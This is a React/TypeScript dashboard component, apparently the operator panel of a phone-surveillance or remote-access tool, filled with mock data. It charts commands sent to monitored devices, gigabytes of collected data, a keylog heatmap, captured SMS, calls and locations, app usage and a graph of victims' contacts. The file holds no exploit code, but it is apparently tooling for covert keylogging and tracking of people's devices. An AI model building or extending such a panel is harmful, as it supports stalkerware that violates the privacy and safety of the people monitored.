import React, { useState, useEffect } from 'react';
import {
  TimeSeriesChart,
  KeylogHeatmap,
  AppUsageDonut,
  NetworkGraph,
  Timeline,
  ActivityChart,
} from '../../components/charts';

interface AnalyticsProps {
  deviceId?: string;
}

export const Analytics: React.FC<AnalyticsProps> = ({ deviceId }) => {
  const [timeRange, setTimeRange] = useState<'1h' | '24h' | '7d' | '30d'>('24h');
  const [selectedDevice, setSelectedDevice] = useState<string>(deviceId || 'all');

  // Mock data - Replace with actual API calls
  const [activityData, setActivityData] = useState([
    {
      name: 'Commands',
      data: generateMockData(20, 'commands'),
    },
    {
      name: 'Data Collected',
      data: generateMockData(20, 'data'),
    },
  ]);

  const [keylogHeatmapData, setKeylogHeatmapData] = useState(
    Array.from({ length: 24 }, (_, hour) => ({
      name: `${hour}`,
      data: Array.from({ length: 7 }, () => Math.floor(Math.random() * 200)),
    }))
  );

  const [appUsageData, setAppUsageData] = useState([
    { name: 'WhatsApp', value: 180 },
    { name: 'Instagram', value: 120 },
    { name: 'Chrome', value: 90 },
    { name: 'YouTube', value: 150 },
    { name: 'Facebook', value: 60 },
    { name: 'Others', value: 100 },
  ]);

  const [networkNodes, setNetworkNodes] = useState([
    { id: '1', label: 'John', size: 20, color: '#3b82f6' },
    { id: '2', label: 'Sarah', size: 18, color: '#8b5cf6' },
    { id: '3', label: 'Mike', size: 15, color: '#ec4899' },
    { id: '4', label: 'Emma', size: 22, color: '#10b981' },
    { id: '5', label: 'David', size: 16, color: '#f59e0b' },
  ]);

  const [networkEdges, setNetworkEdges] = useState([
    { from: '1', to: '2', strength: 0.8 },
    { from: '1', to: '3', strength: 0.5 },
    { from: '2', to: '4', strength: 0.9 },
    { from: '3', to: '5', strength: 0.6 },
    { from: '4', to: '5', strength: 0.7 },
  ]);

  const [timelineData, setTimelineData] = useState([
    {
      x: 'SMS',
      y: [Date.now() - 3600000 * 5, Date.now() - 3600000 * 4],
      label: '15 messages',
    },
    {
      x: 'Calls',
      y: [Date.now() - 3600000 * 3, Date.now() - 3600000 * 2.5],
      label: '3 calls',
    },
    {
      x: 'Locations',
      y: [Date.now() - 3600000 * 2, Date.now() - 3600000 * 1],
      label: '50 locations',
    },
    {
      x: 'Apps',
      y: [Date.now() - 3600000 * 1.5, Date.now() - 3600000 * 0.5],
      label: 'WhatsApp, Instagram',
    },
  ]);

  const handleExportAll = () => {
    // Export all charts
    console.log('Exporting all charts...');
    // Implementation would trigger export on all chart refs
  };

  return (
    <div className="min-h-screen bg-gray-900 p-6">
      {/* Header */}
      <div className="mb-6">
        <h1 className="text-3xl font-bold text-white mb-2">Analytics Dashboard</h1>
        <p className="text-gray-400">Device activity and data visualization</p>
      </div>

      {/* Filters */}
      <div className="bg-gray-800 rounded-lg p-4 mb-6 flex flex-wrap gap-4 items-center">
        <div>
          <label className="text-sm text-gray-400 mr-2">Time Range:</label>
          <select
            value={timeRange}
            onChange={e => setTimeRange(e.target.value as any)}
            className="bg-gray-700 text-white px-3 py-2 rounded border border-gray-600 focus:border-blue-500 focus:outline-none"
          >
            <option value="1h">Last Hour</option>
            <option value="24h">Last 24 Hours</option>
            <option value="7d">Last 7 Days</option>
            <option value="30d">Last 30 Days</option>
          </select>
        </div>

        <div>
          <label className="text-sm text-gray-400 mr-2">Device:</label>
          <select
            value={selectedDevice}
            onChange={e => setSelectedDevice(e.target.value)}
            className="bg-gray-700 text-white px-3 py-2 rounded border border-gray-600 focus:border-blue-500 focus:outline-none"
          >
            <option value="all">All Devices</option>
            <option value="device1">Device 1</option>
            <option value="device2">Device 2</option>
          </select>
        </div>

        <button
          onClick={handleExportAll}
          className="ml-auto px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded transition flex items-center gap-2"
        >
          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"
            />
          </svg>
          Export All
        </button>
      </div>

      {/* Charts Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Activity Chart */}
        <div className="lg:col-span-2">
          <ActivityChart
            series={activityData}
            title="Device Activity Over Time"
            height={300}
            realtimeUpdate={false}
          />
        </div>

        {/* Keylog Heatmap */}
        <KeylogHeatmap
          data={keylogHeatmapData}
          onCellClick={(hour, day, value) =>
            console.log(`Clicked: Hour ${hour}, Day ${day}, Value ${value}`)
          }
        />

        {/* App Usage Donut */}
        <AppUsageDonut
          data={appUsageData}
          onSliceClick={(app, value) => console.log(`Clicked: ${app} - ${value} min`)}
        />

        {/* Timeline */}
        <div className="lg:col-span-2">
          <Timeline
            data={timelineData}
            onEventClick={event => console.log('Event clicked:', event)}
          />
        </div>

        {/* Network Graph */}
        <div className="lg:col-span-2">
          <NetworkGraph
            nodes={networkNodes}
            edges={networkEdges}
            width={800}
            height={400}
            onNodeClick={nodeId => console.log('Node clicked:', nodeId)}
          />
        </div>
      </div>

      {/* Summary Stats */}
      <div className="mt-6 grid grid-cols-1 md:grid-cols-4 gap-4">
        <div className="bg-gray-800 rounded-lg p-4">
          <div className="text-sm text-gray-400 mb-1">Total Commands</div>
          <div className="text-2xl font-bold text-white">1,247</div>
          <div className="text-xs text-green-400 mt-1">+12% from last period</div>
        </div>
        <div className="bg-gray-800 rounded-lg p-4">
          <div className="text-sm text-gray-400 mb-1">Data Collected</div>
          <div className="text-2xl font-bold text-white">3.2 GB</div>
          <div className="text-xs text-green-400 mt-1">+8% from last period</div>
        </div>
        <div className="bg-gray-800 rounded-lg p-4">
          <div className="text-sm text-gray-400 mb-1">Active Devices</div>
          <div className="text-2xl font-bold text-white">24</div>
          <div className="text-xs text-gray-400 mt-1">2 offline</div>
        </div>
        <div className="bg-gray-800 rounded-lg p-4">
          <div className="text-sm text-gray-400 mb-1">Avg Response Time</div>
          <div className="text-2xl font-bold text-white">1.8s</div>
          <div className="text-xs text-red-400 mt-1">+0.3s slower</div>
        </div>
      </div>
    </div>
  );
};

// Helper function to generate mock data
function generateMockData(points: number, type: string): { x: number; y: number }[] {
  const now = Date.now();
  const interval = 3600000; // 1 hour
  return Array.from({ length: points }, (_, i) => ({
    x: now - (points - i) * interval,
    y: Math.floor(Math.random() * (type === 'commands' ? 50 : 100)),
  }));
}
